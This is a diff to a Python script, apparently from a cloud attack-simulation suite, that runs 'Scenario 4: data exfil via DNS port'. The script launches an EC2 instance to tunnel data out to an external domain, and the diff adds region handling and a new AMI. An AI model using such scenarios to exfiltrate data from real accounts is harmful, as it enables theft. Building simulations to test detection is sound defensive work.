@@ -12,23 +12,24 @@ def main():
     AWS_ACCESS_KEY = sys.argv[1]
     AWS_SECRET_KEY = sys.argv[2]
     NUMBER_OF_INSTANCES = 1
+    AWS_REGION = 'ap-southeast-2'
 
     print("Running Scenario 4: data exfil via DNS port")
     print("====================================================================")
 
-    data_exfil(AWS_ACCESS_KEY, AWS_SECRET_KEY, NUMBER_OF_INSTANCES)
+    data_exfil(AWS_ACCESS_KEY, AWS_SECRET_KEY, NUMBER_OF_INSTANCES, AWS_REGION)
 
     print("Running Scenario 4: Completed")
     print("====================================================================")
 
-def data_exfil(AWS_ACCESS_KEY, AWS_SECRET_KEY, NUMBER_OF_INSTANCES):
+def data_exfil(AWS_ACCESS_KEY, AWS_SECRET_KEY, NUMBER_OF_INSTANCES, AWS_REGION):
 
-    ec2 = boto3.resource('ec2', aws_access_key_id = AWS_ACCESS_KEY, aws_secret_access_key = AWS_SECRET_KEY)
+    ec2 = boto3.resource('ec2', aws_access_key_id = AWS_ACCESS_KEY, aws_secret_access_key = AWS_SECRET_KEY, region_name=AWS_REGION)
 
     print("Creating the instance to tunnel out *** make sure adns.yukozuna.com is live!!!")
     try:
         instance = ec2.create_instances(
-                        ImageId='ami-0b72132eb3104947d',
+                        ImageId='ami-0b3d7a5ecc2daba4c',
                         InstanceType='t2.micro',
                         MaxCount=NUMBER_OF_INSTANCES,
                         MinCount=NUMBER_OF_INSTANCES,
